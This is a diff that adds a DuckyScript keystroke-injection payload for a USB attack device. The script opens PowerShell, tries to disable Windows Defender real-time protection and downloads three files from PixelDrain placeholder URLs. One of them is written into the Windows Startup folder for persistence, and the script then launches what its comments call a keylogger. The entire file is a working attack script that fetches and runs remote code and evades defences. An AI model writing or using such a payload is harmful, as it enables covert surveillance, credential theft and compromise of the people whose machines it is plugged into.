@@ -1,0 +1,57 @@
+REM STAGE 1
+REM open runbox
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell
+ENTER
+DELAY 300
+
+REM STAGE 2
+REM attempts to disable defender
+STRING Set-MpPreference -DisableRealtimeMonitoring $true;
+ENTER
+DELAY 200
+
+REM STAGE 3
+REM downloading files from PixelDrain
+
+REM Replace with your actual PixelDrain file URLs
+STRING $pixelDrainP = "https://pixeldrain.com/api/file/YOUR_P_FILE_ID";
+ENTER
+DELAY 100
+STRING $pixelDrainL = "https://pixeldrain.com/api/file/YOUR_L_FILE_ID";
+ENTER
+DELAY 100
+STRING $pixelDrainC = "https://pixeldrain.com/api/file/YOUR_C_FILE_ID";
+ENTER
+DELAY 100
+
+REM Download the files to the temp folder
+STRING cd $env:temp; 
+ENTER
+DELAY 100
+
+REM Download p.ps1 from PixelDrain
+STRING Invoke-WebRequest "$pixelDrainP" -OutFile "$env:temp\p.ps1";
+ENTER
+DELAY 300
+
+REM Download l.ps1 from PixelDrain
+STRING Invoke-WebRequest "$pixelDrainL" -OutFile "$env:temp\l.ps1";
+ENTER
+DELAY 300
+
+REM Download c.cmd from PixelDrain to Startup directory
+STRING Invoke-WebRequest "$pixelDrainC" -OutFile "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/c.cmd";
+ENTER
+DELAY 300
+
+REM STAGE 4
+REM run keylogger
+STRING cd "C:/Users/$env:UserName/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"; .\c.cmd; exit;
+ENTER
+
+REM STAGE 5
+REM deploy
+ENTER
